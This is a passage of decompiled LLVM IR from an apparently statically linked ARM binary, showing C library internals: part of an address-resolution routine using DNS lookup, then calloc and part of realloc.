  %v0_f854 = load i32, i32* @r8, align 4
  %v1_f854 = load i32, i32* %r0.global-to-local, align 4
  %v2_f854 = add i32 %v1_f854, %v0_f854
  store i32 %v2_f854, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_f85c = add i32 %v2_f854, 16
  store i32 %v1_f85c, i32* %r2.global-to-local, align 4
  %v1_f860 = add i32 %v2_f854, 24
  store i32 %v1_f860, i32* @r5, align 4
  %v3_f868 = inttoptr i32 %v1_f85c to i32*
  store i32 %v2_f854, i32* %v3_f868, align 4
  %v0_f86c = load i32, i32* @sb, align 4
  store i32 %v0_f86c, i32* @r1, align 4
  %v0_f870 = load i32, i32* @r4, align 4
  %v1_f870 = load i32, i32* %r2.global-to-local, align 4
  %v2_f870 = add i32 %v1_f870, 4
  %v3_f870 = inttoptr i32 %v2_f870 to i32*
  store i32 %v0_f870, i32* %v3_f870, align 4
  %v0_f874 = load i32, i32* @r5, align 4
  store i32 %v0_f874, i32* %r0.global-to-local, align 4
  %v0_f878 = load i32, i32* @sl, align 4
  store i32 %v0_f878, i32* %r2.global-to-local, align 4
  %v3_f87c = call i32 @strncpy(i32 %v0_f874, i32 %v0_f86c, i32 %v0_f878)
  %v0_f880 = load i32, i32* @r4, align 4
  %v1_f880 = trunc i32 %v0_f880 to i8
  %v2_f880 = load i32, i32* @r5, align 4
  %v3_f880 = load i32, i32* @sl, align 4
  %v4_f880 = add i32 %v3_f880, %v2_f880
  %v5_f880 = inttoptr i32 %v4_f880 to i8*
  store i8 %v1_f880, i8* %v5_f880, align 1
  %v0_f884 = load i32, i32* @sb, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_f88c = load i32, i32* @r8, align 4
  store i32 %v0_f88c, i32* %r2.global-to-local, align 4
  %v3_f890 = inttoptr i32 %v0_f884 to i8*
  %v4_f890 = call i32 @inet_pton(i32 10, i8* %v3_f890, i32 %v0_f88c)
  store i32 %v4_f890, i32* %r0.global-to-local, align 4
  %v1_f894 = load i32, i32* @r4, align 4
  %v9_f894 = icmp eq i32 %v4_f890, %v1_f894
  br i1 %v9_f894, label %dec_label_pc_f8cc, label %dec_label_pc_f89c

dec_label_pc_f89c:                                ; preds = %dec_label_pc_f854
  store i32 %v1_f85c, i32* @ip, align 4
  %v0_f8a4 = load i32, i32* @r6, align 4
  store i32 %v0_f8a4, i32* %v2_f7a0, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_f8ac = load i32, i32* @r6, align 4
  %v2_f8ac = add i32 %v1_f8ac, 8
  %v3_f8ac = inttoptr i32 %v2_f8ac to i32*
  store i32 10, i32* %v3_f8ac, align 4
  %v0_f8b0 = load i32, i32* @r4, align 4
  store i32 %v0_f8b0, i32* %r0.global-to-local, align 4
  %v0_f8b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8b4 = add i32 %v0_f8b4, 6
  store i32 %v1_f8b4, i32* %r3.global-to-local, align 4
  %v1_f8b8 = load i32, i32* @r6, align 4
  %v2_f8b8 = add i32 %v1_f8b8, 12
  %v3_f8b8 = inttoptr i32 %v2_f8b8 to i32*
  store i32 %v1_f8b4, i32* %v3_f8b8, align 4
  %v0_f8bc = load i32, i32* @r5, align 4
  %v1_f8bc = load i32, i32* @r6, align 4
  %v2_f8bc = inttoptr i32 %v1_f8bc to i32*
  store i32 %v0_f8bc, i32* %v2_f8bc, align 4
  %v0_f8c0 = load i32, i32* @ip, align 4
  %v1_f8c0 = load i32, i32* @r6, align 4
  %v2_f8c0 = add i32 %v1_f8c0, 16
  %v3_f8c0 = inttoptr i32 %v2_f8c0 to i32*
  store i32 %v0_f8c0, i32* %v3_f8c0, align 4
  %v0_f8c4 = load i32, i32* @r4, align 4
  %v1_f8c4 = load i32, i32* @fp, align 4
  %v2_f8c4 = inttoptr i32 %v1_f8c4 to i32*
  store i32 %v0_f8c4, i32* %v2_f8c4, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f8cc:                                ; preds = %dec_label_pc_f854
  %v0_f8cc = load i32, i32* @r7, align 4
  %v2_f8cc = icmp eq i32 %v0_f8cc, 0
  br i1 %v2_f8cc, label %dec_label_pc_f8d4, label %dec_label_pc_f9cc

dec_label_pc_f8d4:                                ; preds = %dec_label_pc_f8cc
  %v2_f8d4 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_f8d4, i32* @r4, align 4
  store i32 %v2_f8d4, i32* %r0.global-to-local, align 4
  store i32 40, i32* @r2, align 4
  %v2_f8e4 = bitcast i32* %stack_var_-84 to i8*
  %v3_f8e4 = call i32 @__GI_memset(i8* %v2_f8e4, i32 0)
  store i32 %v3_f8e4, i32* %r0.global-to-local, align 4
  %v2_f8ec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_f8ec, i32* @sb, align 4
  %v7_f92c = icmp eq i32 %tmp9, 5
  br label %dec_label_pc_f8f0

dec_label_pc_f8f0:                                ; preds = %dec_label_pc_f944, %dec_label_pc_f8d4
  store i32 %v2_f8ec, i32* %r2.global-to-local, align 4
  store i32 %v2_f8d4, i32* %r3.global-to-local, align 4
  %v0_f8fc = load i32, i32* @r5, align 4
  store i32 %v0_f8fc, i32* %r0.global-to-local, align 4
  %v4_f900 = inttoptr i32 %v0_f8fc to i8*
  %v5_f900 = call i32 @__dns_lookup(i8* %v4_f900, i32 28, i32 %v2_f8ec, i32 %v2_f8d4)
  store i32 %v5_f900, i32* @r4, align 4
  %v1_f904 = icmp slt i32 %v5_f900, 0
  %v0_f908 = load i32, i32* @sl, align 4
  store i32 %v0_f908, i32* %r2.global-to-local, align 4
  %v0_f90c = load i32, i32* @r7, align 4
  %v1_f90c = add i32 %v0_f90c, 1
  store i32 %v1_f90c, i32* @r7, align 4
  %v0_f910 = load i32, i32* @r5, align 4
  store i32 %v0_f910, i32* %r0.global-to-local, align 4
  br i1 %v1_f904, label %dec_label_pc_f9cc, label %dec_label_pc_f918

dec_label_pc_f918:                                ; preds = %dec_label_pc_f8f0
  %v3_f918 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_f918, i32* @r1, align 4
  %v3_f91c = call i32 @strncpy(i32 %v0_f910, i32 %v3_f918, i32 %v0_f908)
  %v3_f920 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_f920, i32* @r0, align 4
  %v0_f924 = call i32 @free()
  store i32 %v0_f924, i32* %r0.global-to-local, align 4
  %v0_f930 = load i32, i32* @r4, align 4
  store i32 %v0_f930, i32* %r2.global-to-local, align 4
  %v0_f934 = load i32, i32* @r5, align 4
  store i32 %v0_f934, i32* @r3, align 4
  br i1 %v7_f92c, label %dec_label_pc_f93c, label %dec_label_pc_f974

dec_label_pc_f93c:                                ; preds = %dec_label_pc_f918
  %v0_f93c = load i32, i32* @r7, align 4
  %v8_f940 = icmp sgt i32 %v0_f93c, 5
  br i1 %v8_f940, label %dec_label_pc_f968, label %dec_label_pc_f944

dec_label_pc_f944:                                ; preds = %dec_label_pc_f93c
  store i32 %tmp8, i32* @r1, align 4
  %v3_f948 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f948, i32* %r0.global-to-local, align 4
  %v0_f94c = load i32, i32* @sl, align 4
  %v5_f950 = call i32 @__decode_dotted(i32 %v3_f948, i32 %tmp8, i32 %v0_f930, i32 %v0_f934, i32 %v0_f94c)
  store i32 %v5_f950, i32* @r4, align 4
  %v3_f958 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f958, i32* @r0, align 4
  %v0_f95c = call i32 @free()
  store i32 %v0_f95c, i32* %r0.global-to-local, align 4
  %v0_f960 = load i32, i32* @r4, align 4
  %v1_f960 = icmp slt i32 %v0_f960, 0
  br i1 %v1_f960, label %dec_label_pc_f968, label %dec_label_pc_f8f0

dec_label_pc_f968:                                ; preds = %dec_label_pc_f944, %dec_label_pc_f93c
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f974:                                ; preds = %dec_label_pc_f918
  %v7_f974 = icmp eq i32 %tmp9, 28
  br i1 %v7_f974, label %dec_label_pc_f97c, label %dec_label_pc_f9c4

dec_label_pc_f97c:                                ; preds = %dec_label_pc_f974
  store i32 16, i32* @r2, align 4
  %v0_f984 = load i32, i32* @r8, align 4
  store i32 %v0_f984, i32* @r0, align 4
  %v0_f988 = call i32 @memcpy()
  store i32 10, i32* %r3.global-to-local, align 4
  store i32 %v1_f85c, i32* %r2.global-to-local, align 4
  %v1_f994 = load i32, i32* @r6, align 4
  %v2_f994 = add i32 %v1_f994, 8
  %v3_f994 = inttoptr i32 %v2_f994 to i32*
  store i32 10, i32* %v3_f994, align 4
  %v0_f998 = load i32, i32* %r3.global-to-local, align 4
  %v1_f998 = add i32 %v0_f998, 6
  store i32 %v1_f998, i32* %r3.global-to-local, align 4
  %v1_f99c = load i32, i32* @r6, align 4
  %v2_f99c = add i32 %v1_f99c, 12
  %v3_f99c = inttoptr i32 %v2_f99c to i32*
  store i32 %v1_f998, i32* %v3_f99c, align 4
  %v3_f9a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f9a0, i32* @r0, align 4
  %v0_f9a4 = load i32, i32* @r5, align 4
  %v1_f9a4 = load i32, i32* @r6, align 4
  %v2_f9a4 = inttoptr i32 %v1_f9a4 to i32*
  store i32 %v0_f9a4, i32* %v2_f9a4, align 4
  %v0_f9a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_f9a8 = load i32, i32* @r6, align 4
  %v2_f9a8 = add i32 %v1_f9a8, 16
  %v3_f9a8 = inttoptr i32 %v2_f9a8 to i32*
  store i32 %v0_f9a8, i32* %v3_f9a8, align 4
  %v0_f9ac = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_f9bc = load i32, i32* @r6, align 4
  store i32 %v0_f9bc, i32* %v2_f7a0, align 4
  %v0_f9d4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f9c4:                                ; preds = %dec_label_pc_f974
  %v3_f9c4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_f9c4, i32* @r0, align 4
  %v0_f9c8 = call i32 @free()
  store i32 %v0_f9c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9cc

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f8f0, %dec_label_pc_f8cc, %dec_label_pc_f9c4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_f97c, %dec_label_pc_f968, %dec_label_pc_f9cc
  %v0_f9d4 = phi i32 [ %v0_f9d4.pre, %dec_label_pc_f97c ], [ 3, %dec_label_pc_f968 ], [ 1, %dec_label_pc_f9cc ]
  %v1_f9d4 = load i32, i32* @fp, align 4
  %v2_f9d4 = inttoptr i32 %v1_f9d4 to i32*
  store i32 %v0_f9d4, i32* %v2_f9d4, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f9dc:                                ; preds = %dec_label_pc_f794, %dec_label_pc_f7a8
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f9e0

dec_label_pc_f9e0:                                ; preds = %bb, %bb30, %dec_label_pc_f81c, %dec_label_pc_f800, %dec_label_pc_f9d4, %dec_label_pc_f89c, %dec_label_pc_f774, %dec_label_pc_f9dc
  store i32 %v9_f74c, i32* @r6, align 4
  store i32 %v12_f74c, i32* @r7, align 4
  store i32 %v24_f74c, i32* @fp, align 4
  %v1_f9e8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_f9e8

; uselistorder directives
  uselistorder i32 %v2_f8d4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f85c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_f830, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 22, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 12, 10, 11, 14, 13, 15, 17, 16, 18, 20, 19, 21, 23 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 0 }
  uselistorder i32 -24, { 1, 0 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f9e0, { 7, 4, 5, 1, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_f9dc, { 1, 0 }
  uselistorder label %dec_label_pc_f9d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f9cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f82c, { 2, 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_f9ec = load i32, i32* @r4, align 4
  %v6_f9ec = load i32, i32* @r5, align 4
  %v9_f9ec = load i32, i32* @r6, align 4
  %v12_f9ec = load i32, i32* @lr, align 4
  %v2_f9f4 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_fa04 = mul i32 %arg2, %arg1
  store i32 %v2_fa04, i32* @r6, align 4
  br i1 %v2_f9f4, label %dec_label_pc_fa34, label %dec_label_pc_fa0c

dec_label_pc_fa0c:                                ; preds = %entry
  %v2_fa14 = udiv i32 %v2_fa04, %arg1
  %v9_fa18 = icmp eq i32 %v2_fa14, %arg2
  br i1 %v9_fa18, label %dec_label_pc_fa34, label %dec_label_pc_fa20

dec_label_pc_fa20:                                ; preds = %dec_label_pc_fa0c
  %v0_fa20 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_fa2c = inttoptr i32 %v0_fa20 to i32*
  store i32 12, i32* %v2_fa2c, align 4
  br label %dec_label_pc_faf8

dec_label_pc_fa34:                                ; preds = %dec_label_pc_fa0c, %entry
  %v4_fa38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 72) to i32*), align 4
  store i32 %v4_fa38, i32* @r4, align 4
  %v4_fa50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  store i32 %v4_fa50, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_fa50)
  %v0_fa64 = load i32, i32* @r5, align 4
  %v2_fa64 = add i32 %v0_fa64, 16
  %v3_fa64 = inttoptr i32 %v2_fa64 to i32*
  %v4_fa64 = load i32, i32* %v3_fa64, align 4
  store i32 %v4_fa64, i32* %ip.global-to-local, align 4
  store i32 64112, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_fa64)
  %v0_fa70 = load i32, i32* @r6, align 4
  %v1_fa74 = call i32 @malloc(i32 %v0_fa70)
  store i32 %v1_fa74, i32* %r4.global-to-local, align 4
  %v2_fa78 = icmp eq i32 %v1_fa74, 0
  br i1 %v2_fa78, label %.thread, label %dec_label_pc_fa80

dec_label_pc_fa80:                                ; preds = %dec_label_pc_fa34
  %v1_fa80 = add i32 %v1_fa74, -4
  %v2_fa80 = inttoptr i32 %v1_fa80 to i32*
  %v3_fa80 = load i32, i32* %v2_fa80, align 4
  %v1_fa84 = and i32 %v3_fa80, 2
  %v2_fa84 = icmp eq i32 %v1_fa84, 0
  br i1 %v2_fa84, label %dec_label_pc_fa8c, label %.thread

dec_label_pc_fa8c:                                ; preds = %dec_label_pc_fa80
  %v1_fa8c6 = add i32 %v3_fa80, -4
  %v1_fa90 = and i32 %v1_fa8c6, -4
  store i32 %v1_fa90, i32* @r2, align 4
  %v3_fa94 = udiv i32 %v1_fa90, 4
  store i32 %v3_fa94, i32* %ip.global-to-local, align 4
  %tmp = icmp eq i32 %v1_fa90, 36
  %v2_fa9c = icmp ult i32 %v1_fa90, 33
  %v3_fa9c = or i1 %tmp, %v2_fa9c
  br i1 %v3_fa9c, label %dec_label_pc_faa8, label %dec_label_pc_faa0

dec_label_pc_faa0:                                ; preds = %dec_label_pc_fa8c
  %v2_faa0 = inttoptr i32 %v1_fa74 to i8*
  %v3_faa0 = call i32 @__GI_memset(i8* %v2_faa0, i32 0)
  br label %.thread

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa8c
  %tmp7 = icmp eq i32 %v1_fa90, 16
  %v2_faac = inttoptr i32 %v1_fa74 to i32*
  store i32 0, i32* %v2_faac, align 4
  %v1_fab0 = load i32, i32* %r4.global-to-local, align 4
  %v2_fab0 = add i32 %v1_fab0, 4
  %v3_fab0 = inttoptr i32 %v2_fab0 to i32*
  store i32 0, i32* %v3_fab0, align 4
  %v1_fab4 = load i32, i32* %r4.global-to-local, align 4
  %v2_fab4 = add i32 %v1_fab4, 8
  %v3_fab4 = inttoptr i32 %v2_fab4 to i32*
  store i32 0, i32* %v3_fab4, align 4
  %v2_fab8 = icmp ult i32 %v1_fa90, 13
  %v3_fab8 = or i1 %tmp7, %v2_fab8
  br i1 %v3_fab8, label %.thread, label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faa8
  %v0_fabc = load i32, i32* %ip.global-to-local, align 4
  %v1_fac0 = load i32, i32* %r4.global-to-local, align 4
  %v2_fac0 = add i32 %v1_fac0, 12
  %v3_fac0 = inttoptr i32 %v2_fac0 to i32*
  store i32 0, i32* %v3_fac0, align 4
  %v1_fac4 = load i32, i32* %r4.global-to-local, align 4
  %v2_fac4 = add i32 %v1_fac4, 16
  %v3_fac4 = inttoptr i32 %v2_fac4 to i32*
  store i32 0, i32* %v3_fac4, align 4
  %tmp8 = icmp ult i32 %v0_fabc, 7
  br i1 %tmp8, label %.thread, label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_fabc
  %v0_facc = load i32, i32* %ip.global-to-local, align 4
  %v7_facc = icmp eq i32 %v0_facc, 9
  %v1_fad0 = load i32, i32* %r4.global-to-local, align 4
  %v2_fad0 = add i32 %v1_fad0, 20
  %v3_fad0 = inttoptr i32 %v2_fad0 to i32*
  store i32 0, i32* %v3_fad0, align 4
  %v1_fad4 = load i32, i32* %r4.global-to-local, align 4
  %v2_fad4 = add i32 %v1_fad4, 24
  %v3_fad4 = inttoptr i32 %v2_fad4 to i32*
  store i32 0, i32* %v3_fad4, align 4
  br i1 %v7_facc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_facc
  %v2_fad8 = load i32, i32* %r4.global-to-local, align 4
  %v3_fad8 = add i32 %v2_fad8, 32
  %v4_fad8 = inttoptr i32 %v3_fad8 to i32*
  store i32 0, i32* %v4_fad8, align 4
  %v2_fadc = load i32, i32* %r4.global-to-local, align 4
  %v3_fadc = add i32 %v2_fadc, 28
  %v4_fadc = inttoptr i32 %v3_fadc to i32*
  store i32 0, i32* %v4_fadc, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_facc, %dec_label_pc_fa80, %dec_label_pc_fabc, %dec_label_pc_faa8, %dec_label_pc_fa34, %dec_label_pc_faa0, %bb
  %v0_faec = load i32, i32* @r5, align 4
  %v2_faec = add i32 %v0_faec, 24
  %v3_faec = inttoptr i32 %v2_faec to i32*
  %v4_faec = load i32, i32* %v3_faec, align 4
  store i32 %v4_faec, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_faec)
  br label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %dec_label_pc_fa20, %.thread
  %v0_faf8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_f9ec, i32* @r4, align 4
  store i32 %v6_f9ec, i32* @r5, align 4
  store i32 %v9_f9ec, i32* @r6, align 4
  store i32 %v12_f9ec, i32* @lr, align 4
  ret i32 %v0_faf8

; uselistorder directives
  uselistorder i32 %v1_fa90, { 0, 5, 1, 4, 3, 2 }
  uselistorder i32 %v1_fa74, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 13, { 0, 6, 3, 4, 7, 5, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_faf8, { 1, 0 }
  uselistorder label %.thread, { 6, 0, 2, 3, 5, 1, 4 }
}

define i32 @function_fb0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_fb0c:
  %v0_fb0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fb0c, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_fb0c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_fb0c, %bb
  %v10_fb1c = phi i32 [ %arg1, %dec_label_pc_fb0c ], [ 0, %bb ]
  ret i32 %v10_fb1c

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_fb20 = load i32, i32* @r4, align 4
  %v6_fb20 = load i32, i32* @r5, align 4
  %v9_fb20 = load i32, i32* @r6, align 4
  %v12_fb20 = load i32, i32* @r7, align 4
  %v15_fb20 = load i32, i32* @r8, align 4
  %v18_fb20 = load i32, i32* @sb, align 4
  %v21_fb20 = load i32, i32* @sl, align 4
  %v24_fb20 = load i32, i32* @fp, align 4
  %v27_fb20 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_fb2c = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_fb2c, label %dec_label_pc_fb40, label %dec_label_pc_fb50

dec_label_pc_fb40:                                ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_fb44 = call i32 @malloc(i32 %arg2)
  store i32 %v1_fb44, i32* %r0.global-to-local, align 4
  store i32 %v1_fb44, i32* @r4, align 4
  br label %dec_label_pc_fea8

dec_label_pc_fb50:                                ; preds = %entry
  %v2_fb50 = icmp eq i32 %arg2, 0
  br i1 %v2_fb50, label %dec_label_pc_fb58, label %dec_label_pc_fb64

dec_label_pc_fb58:                                ; preds = %dec_label_pc_fb50
  %v0_fb58 = call i32 @free()
  store i32 %v0_fb58, i32* %r0.global-to-local, align 4
  %v0_fb5c = load i32, i32* @r6, align 4
  store i32 %v0_fb5c, i32* @r4, align 4
  br label %dec_label_pc_fea8

dec_label_pc_fb64:                                ; preds = %dec_label_pc_fb50
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_fb6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 72) to i32*), align 4
  store i32 %v4_fb6c, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_fb6c, i32* %r2.global-to-local, align 4
  %v4_fb78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 36) to i32*), align 4
  store i32 %v4_fb78, i32* %r1.global-to-local, align 4
  %v2_fb7c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_fb7c, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_fb84 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_fb84)
  %v0_fb90 = load i32, i32* @r4, align 4
  store i32 %v0_fb90, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* %r1.global-to-local, align 4
  %v4_fb9c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 16) to i32*), align 4
  store i32 %v4_fb9c, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_fba8.327 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_fb9c)
  %v0_fba8 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_fba8, -32
  br i1 %tmp36, label %dec_label_pc_fbc4, label %dec_label_pc_fbb0

dec_label_pc_fbb0:                                ; preds = %dec_label_pc_fb64
  %v0_fbb0 = call i32 @__GI___errno_location()
  store i32 %v0_fbb0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_fbbc = inttoptr i32 %v0_fbb0 to i32*
  store i32 12, i32* %v2_fbbc, align 4
  br label %dec_label_pc_fea8

dec_label_pc_fbc4:                                ; preds = %dec_label_pc_fb64
  %v1_fbc4 = add i32 %v0_fba8, 11
  store i32 %v1_fbc4, i32* %r0.global-to-local, align 4
  %v0_fbc8 = load i32, i32* @r5, align 4
  %v1_fbc8 = add i32 %v0_fbc8, -4
  %v2_fbc8 = inttoptr i32 %v1_fbc8 to i32*
  %v3_fbc8 = load i32, i32* %v2_fbc8, align 4
  store i32 %v3_fbc8, i32* %r2.global-to-local, align 4
  %v2_fbcc = icmp ugt i32 %v1_fbc4, 14
  %v7_fbcc = icmp eq i32 %v1_fbc4, 15
  %v2_fbd0 = xor i1 %v2_fbcc, true
  %v3_fbd0 = or i1 %v7_fbcc, %v2_fbd0
  br i1 %v3_fbd0, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_fbc4
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_fbc4, %bb
  %v2_fbd4 = xor i1 %v7_fbcc, true
  %v3_fbd4 = and i1 %v2_fbcc, %v2_fbd4
  br i1 %v3_fbd4, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_fbd4 = and i32 %v1_fbc4, -8
  store i32 %v5_fbd4, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_fbd8 = and i32 %v3_fbc8, 2
  %v2_fbd8 = icmp eq i32 %v1_fbd8, 0
  %v1_fbdc = add i32 %v0_fbc8, -8
  store i32 %v1_fbdc, i32* @sl, align 4
  %v1_fbe0 = and i32 %v3_fbc8, -4
  store i32 %v1_fbe0, i32* @r6, align 4
  br i1 %v2_fbd8, label %dec_label_pc_fbe8, label %dec_label_pc_fdc0

dec_label_pc_fbe8:                                ; preds = %bb29
  %v1_fbe8 = load i32, i32* @sb, align 4
  %v3_fbe8 = icmp ult i32 %v1_fbe0, %v1_fbe8
  br i1 %v3_fbe8, label %dec_label_pc_fbf4, label %bb30

bb30:                                             ; preds = %dec_label_pc_fbe8
  store i32 %v1_fbe0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd58

dec_label_pc_fbf4:                                ; preds = %dec_label_pc_fbe8
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_fbfc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_fbfc, i32* %r0.global-to-local, align 4
  %v1_fc00 = add i32 %v4_fbfc, 44
  %v2_fc00 = inttoptr i32 %v1_fc00 to i32*
  %v3_fc00 = load i32, i32* %v2_fc00, align 4
  store i32 %v3_fc00, i32* %r3.global-to-local, align 4
  %v2_fc04 = add i32 %v1_fbe0, %v1_fbdc
  store i32 %v2_fc04, i32* @r4, align 4
  %v9_fc08 = icmp eq i32 %v2_fc04, %v3_fc00
  %v1_fc0c = add i32 %v2_fc04, 4
  %v2_fc0c = inttoptr i32 %v1_fc0c to i32*
  %v3_fc0c = load i32, i32* %v2_fc0c, align 4
  store i32 %v3_fc0c, i32* %r1.global-to-local, align 4
  br i1 %v9_fc08, label %dec_label_pc_fc14, label %dec_label_pc_fc50

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fbf4
  %v1_fc14 = and i32 %v3_fc0c, -4
  %v2_fc18 = add i32 %v1_fc14, %v1_fbe0
  store i32 %v2_fc18, i32* %r1.global-to-local, align 4
  %v1_fc1c = add i32 %v1_fbe8, 16
  store i32 %v1_fc1c, i32* %r3.global-to-local, align 4
  %v3_fc20 = icmp ult i32 %v2_fc18, %v1_fc1c
  br i1 %v3_fc20, label %dec_label_pc_fca4, label %dec_label_pc_fc28

dec_label_pc_fc28:                                ; preds = %dec_label_pc_fc14
  %v2_fc28 = sub i32 %v2_fc18, %v1_fbe8
  %v1_fc2c = urem i32 %v3_fbc8, 2
  %v2_fc30 = add i32 %v1_fbe8, %v1_fbdc
  store i32 %v2_fc30, i32* %r1.global-to-local, align 4
  %v2_fc34 = or i32 %v1_fbe8, %v1_fc2c
  store i32 %v2_fc34, i32* %r2.global-to-local, align 4
  %v1_fc38 = or i32 %v2_fc28, 1
  store i32 %v1_fc38, i32* %r3.global-to-local, align 4
  store i32 %v0_fbc8, i32* @r4, align 4
  store i32 %v2_fc34, i32* %v2_fbc8, align 4
  %v0_fc44 = load i32, i32* %r1.global-to-local, align 4
